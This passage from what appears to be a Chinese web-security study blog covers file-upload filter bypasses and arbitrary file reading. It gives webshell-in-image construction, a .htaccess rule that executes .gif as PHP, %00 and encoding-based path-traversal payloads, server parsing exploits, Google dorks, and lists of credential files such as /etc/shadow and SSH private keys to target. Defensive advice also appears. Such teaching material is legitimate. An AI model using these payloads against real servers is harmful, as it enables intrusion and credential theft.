+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) {<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"php"</span>,<span class="hljs-string">"php5"</span>,<span class="hljs-string">"php4"</span>,<span class="hljs-string">"php3"</span>,<span class="hljs-string">"php2"</span>,<span class="hljs-string">"html"</span>,<span class="hljs-string">"htm"</span>,<span class="hljs-string">"phtml"</span>,<span class="hljs-string">"pht"</span>,<span class="hljs-string">"jsp"</span>,<span class="hljs-string">"jspa"</span>,<span class="hljs-string">"jspx"</span>,<span class="hljs-string">"jsw"</span>,<span class="hljs-string">"jsv"</span>,<span class="hljs-string">"jspf"</span>,<span class="hljs-string">"jtml"</span>,<span class="hljs-string">"asp"</span>,<span class="hljs-string">"aspx"</span>,<span class="hljs-string">"asa"</span>,<span class="hljs-string">"asax"</span>,<span class="hljs-string">"ascx"</span>,<span class="hljs-string">"ashx"</span>,<span class="hljs-string">"asmx"</span>,<span class="hljs-string">"cer"</span>,<span class="hljs-string">"swf"</span>,<span class="hljs-string">"htaccess"</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$file_name</span>);<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">'/'</span>.<span class="hljs-variable">$file_name</span>;        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) {<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;<br>        }<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
+<pre><code>利用Windows的命名机制
+
+shell.php. shell.php空格 shell.php:1.jpg shell. php::$DATA shell.php:1.jpg
+在Windows中，后缀名后面的点和空格都会被删除掉
+</code></pre>
+<h5 id="2-2白名单">2.2白名单</h5>
+<blockquote>
+<p>原理：白名单检测:一般有个专门的 whitelist 文件，里面会包含的正常文件：<br>
+  <code>Jpg</code> <code>png</code> <code>GIF</code></p>
+</blockquote>
+<p><em><strong>绕过方法</strong></em><br>
+<img src="image-20230517001542778.png" alt="image-20230517001542778"></p>
+<h4 id="3-后端检测-00截断">3.后端检测_00截断</h4>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119652017">点击进入： 【文件上传绕过】——后端检测_文件名检测00截断绕过</a></p>
+<pre><code>原理：虽然web应用做了校验，但是由于文件上传后的路径用户可以控制，攻击者可以利用手动添加字符串标识符0X00的方式来将后面的拼接的内容进行截断，导致后面的内容无效，而且后面的内容又可以帮助我们绕过黑白名单的检测。
+
+思路： 在C语言中，空字符有一个特殊含义，代表字符串的拼接结束。
+这里我们使用的是php语言，属于高级语言，底层靠C语言来实现的，也就是说空字符的字符串拼接结束功能在PHP中也能实现。但是我们在URL中不能直接使用空，这样会造成无法识别；我们通过查看ASCII对照表，发现ASCII对照表第一个就空字符，它对应的16进制是00，这里我们就可以用16进制的00来代替空字符，让它截断后面的内容。
+</code></pre>
+<p>使用<code>burpsuite</code>进行抓包，因为这里是通过<code>URL</code>进行传递的文件上传后存储路径，所以需要对<code>16进制</code>的<code>00</code>进行<code>URL编码</code>，编码的结果就是<code>%00</code>，通过这种方式，就可以用<code>%00</code>截断后面的内容，让拼接的文件名不再进行生效：</p>
+<p><img src="image-20230517001928122.png" alt="image-20230517001928122"></p>
+<h4 id="4-后端检测-MIME检测：">4.后端检测_MIME检测：</h4>
+<blockquote>
+<p><code>MIME(Multipurpose Internet Mail Extensions)</code>多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">常见MIME类型<br>text/plain （纯文本）<br>text/html （HTML文档）<br>text/javascript （js代码）<br>application/xhtml+xml （XHTML文档）<br>image/gif （GIF图像）<br>image/jpeg （JPEG图像）<br>image/png （PNG图像）<br>video/mpeg （MPEG动画）<br>application/octet-stream （二进制数据）<br>application/pdf （PDF文档）<br></code></pre></td></tr></tbody></table></figure>
+<pre><code>检测方式：  
+在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件。
+
+MIME绕过原理：
+部分Web应用系统判定文件类型是通过content-type字段，黑客可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验。
+</code></pre>
+<h4 id="5-后端检测-文件头检测漏洞">5.后端检测_文件头检测漏洞</h4>
+<pre><code>原理： 
+在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。我们可以通过16进制编辑器打开文件，添加服务器允许的文件头以绕过检测。
+
+常见文件头
+GIF：47 49 46 38 39 61
+png： 89 50 4E 47 0D 0A 1A 0A
+jpg：FF D8 FF E0 00 10 4A 46 49 46
+在进行文件头绕过时，我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。
+</code></pre>
+<h4 id="6-后端-内容检测图片马绕过">6.后端_内容检测图片马绕过</h4>
+<pre><code>原理: 一般文件内容验证使用getimagesize函数检测,会判断文件是否是一个有效的文件图片,如果是,则允许上传,否则的话不允许上传。
+</code></pre>
+<p><strong>图片马制作</strong><br>
+准备一张图片，这里为<code>a.png</code>，和一个一句话木马，通过以下命令合成一个图片马<code>3.php</code>：<br>
+<code>a.php</code>内容：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p>命令:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1 | copy a.png /b + a.php /a 3.png  <br>2 | /b:指定以二进制格式复制、合并文件，用于图像或者声音类文件<br>3 | /a:指定以ascii格式复制、合并文件用于txt等文本类文件<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230517002611447.png" alt="image-20230517002611447"></p>
+<p>这个图片搞错了，最后应该是png</p>
+<p><strong>注：这条命令的意思是：通过<code>copy命令</code>，把<code>a.png</code>图片文件，以二进制文件形式添加到<code>a.php</code>文件中，以<code>ASCII文本</code>文件形式输出为`3.png文件。</strong></p>
+<h4 id="7-解析漏洞">7.解析漏洞</h4>
+<h5 id="7-1-htaccess文件解析漏洞">7.1 .htaccess文件解析漏洞</h5>
+<pre><code>漏洞利用前提： web具体应用没有禁止.htaccess文件的上传，同时web服务器提供商允许用户上传自定义的.htaccess文件。
+
+原理： .htaccess文件(或者"分布式配置文件") ,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。
+
+利用方式： 上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。
+</code></pre>
+<p><strong>.htaccess文件内容：</strong></p>
+<pre><code>.htaccess文件解析规则的增加，是可以按照组合的方式去做的，不过具体得自己多测试。
+
+&lt;FilesMatch "evil.gif"&gt;
+SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
+AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
+&lt;/FilesMatch&gt;
+
+AddType application/x-httpd-php .gif 
+</code></pre>
+<h5 id="7-2-Apache解析漏洞">7.2 Apache解析漏洞</h5>
+<pre><code>原理： Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。比如test.php.a.b的“.a”和“.b”这两种后缀是apache不能识别解析，apache就会把test.php.a.b解析成test.php。
+</code></pre>
+<h5 id="7-3-IIS6-0解析漏洞">7.3 IIS6.0解析漏洞</h5>
+<pre><code>IIS6.0解析漏洞分两种：
+1、目录解析：
+以xx.asp命名的文件夹里的文件都将会被当成ASP文件执行。
+2、文件解析：
+xx.asp;.jpg 像这种畸形文件名在;后面的直接被忽略，也就是说当成xx.asp文件执行。
+
+IIS6.0 默认的可执行文件除了asp还包含这三种 .asa .cer .cdx。
+</code></pre>
+<h5 id="7-4-IIS7-0-IIS7-5-Nginx的解析漏洞">7.4 IIS7.0 | IIS7.5 | Nginx的解析漏洞</h5>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">原理：  <br>Nginx拿到文件路径（更专业的说法是URI）/test.jpg/test.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/test.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回Access denied。<br><br>这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项PHP可以对文件路径进行修理。<br>举个例子，当php遇到文件路径/1.jpg/2.txt/3.php时，若/1.jpg/2.txt/3.php不存在，则会去掉最后的/3.php，然后判断/1.jpg/2.txt是否存在，若存在，则把/1.jpg/2.txt当做文件/1.jpg/2.txt/3.php，若/1.jpg/2.txt仍不存在，则继续去掉/2.txt，以此类推。<br></code></pre></td></tr></tbody></table></figure>
+<p>漏洞形式：<code>www.xxxxx.com/UploadFiles/image/1.jpg/1.php</code><br>
+另外两种解析漏洞：<br>
+<code>www.xxxxx.com/UploadFiles/image/1.jpg%00.php</code><br>
+<code>www.xxxxx.com/UploadFiles/image/1.jpg/%20\0.php</code></p>
+<h5 id="7-5-Nginx-漏洞">7.5 Nginx 漏洞</h5>
+<pre><code>PHP+nginx默认是以cgi的方式去运行，当用户配置不当，会导致任意文件被当作php去解析。
+利用条件:
+以FastCGl运行
+cgi.fix_pathinfo=1(全版本PHP默认为开启)
+例如如果满足上述条件，当你访问url/shell.jpg/shell.php时，shell.jpg会被当作php去执行。
+</code></pre>
+<h5 id="7-6-Nginx-文件名逻辑漏洞-CVE-2013-4547">7.6 Nginx 文件名逻辑漏洞(CVE-2013-4547)</h5>
+<pre><code>影响版本:Nginx 0.8.41 ~ 1.4.3/1.5.0 ~ 1.5.7
+利用过程:
+上传一个shell.jpg文件，注意最后为空格
+访问url/shell.jpg[Ox20][Ox00].php
+(两个中括号中的数字是用Burp在Hex界面中更改)
+漏洞复现参考链接
+</code></pre>
+<h4 id="8-二次渲染漏洞">8.二次渲染漏洞</h4>
+<pre><code>原理：  
+在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。
+
+绕过：
+1、配合文件包含漏洞：
+将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的 那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。
+
+2、可以配合条件竞争：
+这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传
+</code></pre>
+<p>如何判断图片是否进行了二次处理？<br>
+ 对比要上传图片与上传后的图片大小，使用16进制编辑器打开图片查看上传后保留了哪些数据，查看那些数据被改变。</p>
+<h4 id="9-条件竞争">9.条件竞争</h4>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;   <span class="hljs-comment">//判断文件上传操作</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])){  <span class="hljs-comment">//判断是否接收到这个文件</span><br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>,<span class="hljs-string">'gif'</span>);  <span class="hljs-comment">//声明一个数组，数组里面有3条数据，为：'jpg','png','gif'</span><br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>];  <span class="hljs-comment">//获取图片的名字</span><br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>]; <span class="hljs-comment">//获取图片的临时存储路径</span><br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">"."</span>)+<span class="hljs-number">1</span>); <span class="hljs-comment">//通过文件名截取图片后缀</span><br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">'/'</span> . <span class="hljs-variable">$file_name</span>; <span class="hljs-comment">//构造图片的上传路径，这里暂时重构图片后缀名。</span><br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>)){ <span class="hljs-comment">//这里对文件进行了转存</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>)){ <span class="hljs-comment">//这里使用截取到的后缀名和数组里面的后缀名进行对比</span><br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">'/'</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-string">"."</span>.<span class="hljs-variable">$file_ext</span>;  <span class="hljs-comment">//如果存在，就对文件名进行重构</span><br>             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);  <span class="hljs-comment">//把上面的文件名进行重命名</span><br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">"只允许上传.jpg|.png|.gif类型文件！"</span>; <span class="hljs-comment">//否则返回"只允许上传.jpg|.png|.gif类型文件！"数据。</span><br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<span class="hljs-comment">// 并删除这个文件</span><br>        }<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">'上传出错！'</span>;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
+<p>代码处理流程：<strong>声明一个数组，保存着允许上传的文件类型–&gt;获取文件名和文件临时存储路径–&gt;截取文件名–&gt;构造文件上传后的存储路径–&gt;对文件进行转存–&gt;比对白名单，如果存在就对文件进行重命名–&gt;否则就删除文件。</strong><br>
+通过上面代码我们发现：<br>
+  服务器先通过move_uploaded_file函数把文件保存了，然后再去判断后缀名是否合法，合法就重命名，如果不合法再删除。重点在于，在多线程情况下，就有可能出现还没处理完，我们就访问了原文件，这样就会导致防护被绕过。<br>
+  我们上传一个文件上去，后端会检验上传文件是否和要求的文件是否一致。如果不能达到要求就会删除文件，如果达成要求就会保留，那么当我们上传文件上去的时候，检测是否到达要求需要一定的时间，这个时间可长可短，但是我们确确实实在某一刻文件已经上传到了指定地址，并且访问到这个文件。这时候就会造成条件竞争。</p>
+<p>参考: <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119750732?ops_request_misc=%7B%22request%5Fid%22%3A%22165009151016780261943514%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=165009151016780261943514&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-16-119750732.142%5Ev9%5Epc_search_result_control_group,157%5Ev4%5Econtrol&amp;utm_term=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81&amp;spm=1018.2226.3001.4187"><strong>【文件上传绕过】——文件上传漏洞基础入门</strong></a><br>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44519789/article/details/116570426"><strong>太厉害了，终于有人能把文件上传漏洞讲的明明白白了</strong></a>—这里还讲了webshell相关内容</p>
+<h3 id="五、防御技巧">五、防御技巧</h3>
+<p>1、文件上传的目录设置为不可执行。只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响。</p>
+<p>2、判断文件类型。在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的，严格过滤扩展名为“.php、.asp、.bat”等可执行文件上传。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p>
+<p>3、使用随机数改写文件名和文件路径。文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</p>
+<p>4、单独设置文件服务器的域名。由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</p>
+<p>5、使用安全设备防御。文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。</p>
+<p>6、隐藏文件上传目录，用户上传文件的目标目录对用户隐藏。</p>
+<h3 id="六、如何构造优质FUZZ字典">六、如何构造优质FUZZ字典</h3>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/188464.html">构造优质上传漏洞Fuzz字典</a></li>
+</ul>
+<h2 id="0x02-文件读取与下载">0x02 文件读取与下载</h2>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">文件读取常见函数:<br>fopen<br>file_get_contents<br>fread<br>fgets<br>fgetss<br>file<br>fpassthru<br>parse_ini_file<br>readfile<br></code></pre></td></tr></tbody></table></figure>
+<h3 id="1-为什么产生任意文件读取与下载漏洞">1. 为什么产生任意文件读取与下载漏洞</h3>
+<p>一些网站的业务需要，可能提供文件查看或下载的功能，如果对用户查看或下载的文件不做限制，就能够查看或下载任意的文件，可以是源文件，敏感文件等等。</p>
+<h3 id="2-任意文件读取漏洞">2. 任意文件读取漏洞</h3>
+<p>任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。<br>
+<strong>漏洞产生原因</strong></p>
+<ul>
+<li>存在读取文件的函数</li>
+<li>读取文件的路径用户可控，且未校验或校验不严</li>
+<li>输出了文件内容</li>
+</ul>
+<p><strong>任意文件读取</strong></p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=”test.txt”;<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=”test.txt”;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p><strong>文件读取函数</strong><br>
+<code>readfile()</code>、<code>file_get_contents()</code>、<code>fopen()</code>中，<code>$filename</code>没有经过校验或者校验不合格，用户可控制变量读取任意文件，如<code>/etc/passwd</code>、<code>./index.php</code>、<code>/config.ini</code>。</p>
+<h3 id="3-文件读取漏洞挖掘">3. 文件读取漏洞挖掘</h3>
+<blockquote>
+<p>1、web漏洞扫描器（awvs、appscan、openvas、nessus）<br>
+2、手动挖掘从连接和参数名查看</p>
+</blockquote>
+<p><em>Google search</em></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">inurl:”readfile.php?file=<br>inurl:”read.php?filename=<br>inurl:”download.php?file=<br>inurl:”down.php?file=<br></code></pre></td></tr></tbody></table></figure>
+<p>连接：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">readfile.php?file=**.txt<br>download.php?file=**.rar<br></code></pre></td></tr></tbody></table></figure>
+<p>参数名：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&amp;RealPath=、&amp;readpath=、&amp;FilePath=、&amp;filepath=、&amp;Path=、&amp;path=、&amp;Inputfile=、&amp;inputfile=、&amp;url=、&amp;urls=、&amp;Lang=、&amp;dis=、&amp;Data=、&amp;data=、&amp;readfile=、&amp;ﬁlep=、&amp;Src=、&amp;src=、&amp;menu=、META-INF= 、WEB-INF<br></code></pre></td></tr></tbody></table></figure>
+<h3 id="4-敏感信息">4. 敏感信息</h3>
+<p><strong>Windows：</strong></p>
+<blockquote>
+<p>C:\boot.ini //查看系统版本<br>
+C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件<br>
+C:\Windows\repair\sam //存储系统初次安装的密码<br>
+C:\Program Files\mysql\my.ini //Mysql配置<br>
+C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>
+C:\Windows\php.ini //php配置信息<br>
+C:\Windows\my.ini //Mysql配置信息</p>
+</blockquote>
+<p><strong>Linux：</strong></p>
+<blockquote>
+<p>/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去<br>
+/root/.ssh/id_rsa  //ssh私钥,ssh公钥是id_rsa.pub<br>
+/root/.ssh/id_ras.keystore  //记录每个访问计算机用户的公钥<br>
+/root/.ssh/known_hosts<br>
+//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。<br>
+/etc/passwd  // 账户信息<br>
+/etc/shadow  // 账户密码文件<br>
+/etc/my.cnf  //mysql 配置文件<br>
+/etc/httpd/conf/httpd.conf  // Apache配置文件<br>
+/root/.bash_history     //用户历史命令记录文件<br>
+/root/.mysql_history    //mysql历史命令记录文件<br>
+/proc/self/fd/fd[0-9]*(文件标识符)<br>
+/proc/mounts     //记录系统挂载设备<br>
+/porc/config.gz   //内核配置文件<br>
+/var/lib/mlocate/mlocate.db //全文件路径<br>
+/porc/self/cmdline //当前进程的cmdline参数</p>
+</blockquote>
+<h3 id="5-绕过思路">5. 绕过思路</h3>
+<p>可以进行fuzz</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1. url编码代替.或者/，如使用%2F代替/<br>   ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd<br>   <br>2. 二次编码(%25)<br>   ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd<br>3. 加入+<br>   ?filename=.+./.+./bin/redacted.dll<br>4. %00<br>   ?filename=.%00./file.php<br>   /etc/passwd%00.jpg<br>5. \<br>   ?filename=..%5c..%5c/windows/win.ini<br>6. Java %c0%ae 安全模式绕过<br>?filename=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd<br></code></pre></td></tr></tbody></table></figure>
+<h3 id="6-Linux下的常见利用姿势">6. Linux下的常见利用姿势</h3>
+<h4 id="6-1-用户目录下的敏感文件">6.1 用户目录下的敏感文件</h4>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.bash_history <br>.zsh_history<br>.psql_history<br>.mysql_history<br>.profile <br>.bashrc<br>.gitconfig<br>.viminfo<br><br>任意文件读取/etc/passwd<br>提取passwd第一列，即root等一系列用户名<br>读history：../../root/.bash_history<br>暴破所有用户的.bash_history：../../../home/§root§/.bash_history<br></code></pre></td></tr></tbody></table></figure>
+<p>历史命令重点关注出现的<code>密码、路径、配置文件路径、其他关联IP、日志文件、war包、备份文件路径</code>等等，可进一步读取或利用。<br>
+PS：如要下载文件，可能会导致过大文件下载失败，可以使用wget进行下载，比如catanlina.out日志文件、war包、备份文件等等。</p>
+<h4 id="6-2-主机凭证文件">6.2 主机凭证文件</h4>
+<p><strong>私钥文件</strong></p>
